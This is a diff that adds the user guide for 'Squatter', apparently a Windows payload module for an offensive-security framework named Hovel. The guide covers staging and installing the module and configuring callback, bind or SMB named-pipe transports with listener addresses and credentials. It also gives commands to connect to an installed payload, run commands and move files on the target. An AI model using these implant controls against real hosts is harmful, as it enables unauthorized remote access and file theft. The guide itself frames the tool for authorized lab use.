@@ -1,0 +1,72 @@
+<!-- hovel-doc: {"title":"Squatter User Guide","group":"squatter","order":10,"navTitle":"User Guide"} -->
+<article>
+        <h1>Squatter User Guide</h1>
+        <p>
+          Squatter is a trusted module package. Install it only in authorized
+          Hovel workspaces and treat it as arbitrary code execution on both the
+          operator host and the target lab host.
+        </p>
+
+        <h2>Use from a Source Checkout</h2>
+        <p>
+          The in-repo module catalogue contains Squatter as a JSON-RPC stdio
+          provider command. Stage the source-tree launchers first so the
+          catalogue's <code>bin/squatter-provider</code> command exists before
+          running module checks.
+        </p>
+<pre data-lang="shell"><code>task release:modules-stage
+HOVEL_MODULE_CONFIG=modules/examples/hovel-modules.json hovel module check squatter</code></pre>
+
+        <h2>Install a Packaged Module</h2>
+        <p>
+          Release packaging stages the provider launcher and the Windows payload
+          into a normal <code>ModulePackage</code> archive under
+          <code>dist/modules</code>.
+        </p>
+<pre data-lang="shell"><code>task release:modules-stage
+task release:modules-package
+hovel module install ./dist/modules/squatter-v0.1.0.tgz
+hovel module check squatter@v0.1.0
+hovel module installed</code></pre>
+
+        <h2>Configure a Transport</h2>
+        <p>
+          The provider defaults to TCP bind when no transport is set. Use
+          <code>payload.transport</code> to choose a concrete transport and then
+          provide the matching endpoint fields.
+        </p>
+<pre data-lang="config"><code>payload.provider = squatter
+payload.format = pe-exe
+payload.transport = smb-named-pipe | tcp-bind | tcp-callback
+payload.bind_port = 9100
+payload.lhost = 10.10.14.3
+payload.lport = 4444
+payload.pipe = neutral-pipe-name
+smb.username = operator
+smb.password = secret
+smb.domain = LAB
+smb.port = 445</code></pre>
+        <p>
+          <code>reverse-tcp</code> is accepted for compatibility and normalized
+          to <code>tcp-callback</code>. SMB named-pipe mode requires explicit SMB
+          credentials. TCP callback mode requires a provider listener before the
+          payload connects back.
+        </p>
+
+        <h2>Operate Payload Records</h2>
+        <p>
+          Successful install steps return durable installed-payload records. Use
+          Hovel's provider-neutral payload commands to reconnect, inspect
+          commands, invoke one typed action, or record cleanup state.
+        </p>
+<pre data-lang="cli"><code>payloads available
+payloads installed
+payloads inspect p1 --events
+payloads connect p1
+payloads commands p1
+payloads call p1 wininfo
+payloads getfile p1 C:\Windows\win.ini
+payloads putfile p1 ./note.txt C:\Windows\Temp\note.txt
+payloads cmd p1 whoami
+payloads cleanup p1</code></pre>
+      </article>
